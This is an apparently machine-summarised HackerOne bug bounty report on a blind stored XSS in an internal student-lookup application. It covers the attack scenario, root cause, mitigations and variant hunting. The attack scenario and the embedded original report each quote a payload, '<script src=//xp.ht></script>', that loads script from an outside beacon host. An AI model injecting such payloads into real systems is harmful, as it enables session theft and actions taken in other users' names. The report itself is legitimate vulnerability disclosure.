# Blind Stored XSS on Internal Host via Student Data

## Metadata
- **Source:** HackerOne
- **Report:** 923912 | https://hackerone.com/reports/923912
- **Submitted:** 2020-07-14
- **Reporter:** sp1d3rs
- **Program:** HackerOne (Undisclosed Organization)
- **Bounty:** Undisclosed
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Blind XSS, Improper Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A blind stored XSS vulnerability was discovered on an internal host within the controlcenterV2 application, likely triggered through student lookup functionality. The vulnerability allowed arbitrary JavaScript execution through stored payloads in student data records, confirmed via out-of-band pingback to attacker-controlled infrastructure.

## Attack scenario
1. Attacker identifies the internal controlcenterV2 endpoint used for student lookups at https://[internal-domain]/NSSI/controlcenterV2/index.htm
2. Attacker injects XSS payload (e.g., <script src=//xp.ht></script>) into student data records, either directly or through another vector
3. Payload remains stored in the application database without proper sanitization
4. When a user performs a student lookup query, the application retrieves and renders student data in HTML without encoding special characters
5. Browser executes the stored JavaScript payload, triggering an external request to attacker's beacon domain (xp.ht)
6. Attacker confirms XSS execution and gains ability to steal session tokens, credentials, or perform actions on behalf of internal users

## Root cause
The application fails to properly sanitize and encode user-controllable data (student records) before rendering it in HTML context. Data flows from student database → application logic → HTML output without context-appropriate encoding. Additionally, lack of Content Security Policy (CSP) allows unrestricted script execution.

## Attacker mindset
Researcher systematically probes internal applications using out-of-band callbacks to detect blind vulnerabilities. The use of beacon domains (xp.ht) demonstrates sophistication in confirming XSS without direct feedback. The discovery of Referer header containing the vulnerable endpoint suggests methodical log analysis or network monitoring.

## Defensive takeaways
- Implement strict input validation on all student data fields - whitelist acceptable characters and formats
- Apply context-appropriate output encoding (HTML entity encoding) for all dynamic content rendered in HTML context
- Deploy Content Security Policy (CSP) with strict-dynamic and script-src restrictions to prevent inline script execution
- Sanitize student records using established libraries (OWASP, DOMPurify) that remove or neutralize script tags
- Implement parameterized queries and separate data from code to prevent injection attacks
- Enable security logging and monitoring to detect suspicious external requests from internal hosts
- Conduct security code review of student lookup and data retrieval functions
- Apply principle of least privilege - restrict who can modify student data
- Regular security testing including blind XSS detection using beacon services

## Variant hunting
Check other lookup endpoints (teacher, course, class lookups) for similar stored XSS patterns
Test all data import/upload features that might populate student records (CSV, API, form submissions)
Examine other internal applications on the same network segment for shared data sources or similar rendering patterns
Review application logs for patterns of XSS payload injection into student data fields
Test referer-based stored XSS in other internal applications where referer might be logged/rendered
Search for other user-controlled fields rendered without encoding (notes, descriptions, comments)
Check for DOM-based XSS in the student lookup JavaScript/frontend code

## MITRE ATT&CK
- T1190
- T1592
- T1105
- T1059

## Notes
This is a blind XSS vulnerability with internal-only impact, making it difficult to exploit or verify without system owner cooperation. The attacker lacks visibility into the actual injection point but has high confidence in the vulnerability due to beacon confirmation. The 'GET /?_=[timestamp]' pattern suggests client-side script execution, likely from cached or pre-loaded payloads. Internal network isolation limits external impact but allows lateral movement and insider attacks. The vulnerability may have existed for extended periods before detection due to its blind nature.

## Full report
<details><summary>Expand</summary>

##Description
Hello. I often use mine `xp.ht` host as a beacon for SSRF/XSS payloads, and today one was triggered from the `https://███████████████/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent&&&&&&&&` endpoint (it was found in the Referer header)

This domain isn't resolvable from outside, so I assume the request came from host in the internal network, connected to extranet.

##POC
███████
Sadly, I'm not sure where is exactly the entry point was for the payload - only the vulnerable URL where it triggered the pingback to my host.
The `GET /?_=1594756841631` indicated that payload is likely reside in HTML source, and was triggered during student lookup (perhaps there is payload  somewhere in the student data containing `<script src=//xp.ht></script>` or similar).
You may need to confirm this with system owner first since I don't have enough details to confirm it from my side since vulnerable host is internal.

## Impact

Blind Stored XSS on the internal host.

</details>

---
*Analysed by Claude on 2026-05-12*
